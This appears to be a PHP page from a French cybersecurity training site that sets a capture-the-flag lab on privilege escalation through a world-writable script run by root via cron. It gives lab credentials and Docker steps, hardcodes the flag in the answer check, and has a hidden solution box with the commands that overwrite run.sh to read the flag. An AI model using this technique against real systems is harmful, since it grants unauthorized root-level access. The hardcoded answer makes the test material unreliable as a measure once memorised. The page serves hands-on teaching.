<?php
require $_SERVER['DOCUMENT_ROOT'] . "/core/auth.php"; // auth universel
include $_SERVER['DOCUMENT_ROOT'] . "/core/header.php"; // header universel
?>

<div class="menu">
    <a href="../index_script.php">⬅ Retour au script</a>
</div>

<h2>Escalade de privilèges via un cron root</h2>

<p>
    Vous disposez d’un accès SSH à une machine ilinux en tant qu’utilisateur <code>ciel</code>i (mdp : choupette).  
    Un script <code>run.sh</code> vous appartient… mais il est exécuté régulièrement par <strong>root</strong> via un cron.  
</p>

<!-- Formulaire pour vérifier la réponse -->
<div style="margin-top: 30px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; max-width: 500px;">
    <h3>Vérifier votre réponse</h3>
    <form method="post">
        <label for="answer">Entrez la réponse :</label><br>
        <input type="text" name="answer" id="answer" style="width: 100%; padding: 5px; margin-top: 5px;" required><br><br>
        <input type="submit" value="Vérifier" style="padding: 5px 10px;">
    </form>

    <?php
    // Vérification de la réponse
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $userAnswer = trim($_POST['answer']);
        $correctAnswer = "La liberté c'est l'esclavage."; // <-- Flag réel

        if ($userAnswer === $correctAnswer) {
            echo '<p style="color: green; font-weight: bold;">OK ! Bravo ✅</p>';
        } else {
            echo '<p style="color: red; font-weight: bold;">NOK ! Dommage ❌</p>';
        }
    }
    ?>
</div>

<div class="challenge-container" style="display: flex; gap: 20px; margin-top: 20px;">

    <!-- Colonne gauche : Commandes utiles -->
    <div class="commands" style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
        <h3>Étapes à suivre</h3>
        <pre>
# Charger l'image téléchargée
docker load -i  t00-ch01-cron.tar

# lancer le container
docker compose up -d

# Se connecter en ssh au container mdp : toor
ssh ciel@localhost -p 2222

# A LA FIN DU CHALLENGE : ARRÊTER ET SUPPRIMER LE CONTAINER 
docker compose down

# Effacer la connexion ssh
ssh-keygen -f '~/.ssh/known_hosts' -R '[localhost]:2222'
        </pre>
    

    </div>

    <!-- Colonne droite : Fichiers à télécharger -->
    <div class="files" style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
        <h3>Fichiers à télécharger</h3>
        <ul>
            <li><a href="/formation/2026/00-script/01-cron/t00-ch01-cron.tar" download>t00-ch01-cron.tar</a></li>
	    <li><a href="/formation/2026/00-script/01-cron/docker-compose.yml">docker-compose.yml</a></li>	
	</ul>
    </div>

</div>

<!-- BOUTON POUR AFFICHER LA SOLUTION -->
<div style="width: 100%; padding: 20px; border: 1px solid #aaa; border-radius: 8px; margin-top: 30px;">

    <button onclick="toggleBox()" 
            style="padding: 10px 18px; font-size: 16px; cursor: pointer;">
        Afficher des éléments de correction (tricheur)
    </button>

    <div id="boxContent" style="display: none; margin-top: 20px; background: #f8f8f8; padding: 15px; border-radius: 6px;">

        <p>
        Erreur de l'administrateur : le ficheir run.sh est accessible en écriture pour tout le monde. Et est executer en roor via cron. Il suffit de l modifier pour executer ce que l'on souhaite.
        </p>

        <pre style="white-space: pre-wrap; width: 100%;">
# Écraser le script exécuté par root
echo "cat /home/ciel/flag.txt > /home/ciel/pwned.txt" > ~/run.sh
ou
encore
chmod 777 /home/ciel/flag.txt
# Attendre le cron (1 minute)
sleep 60

# Lire le flag
cat ~/pwned.txt
ou
cat ~/flag.txt
        </pre>

    </div>
</div>

<script>
function toggleBox() {
    const box = document.getElementById("boxContent");
    box.style.display = box.style.display === "none" ? "block" : "none";
}
</script>

<?php
include $_SERVER['DOCUMENT_ROOT'] . "/core/footer.php"; // footer universel
?>

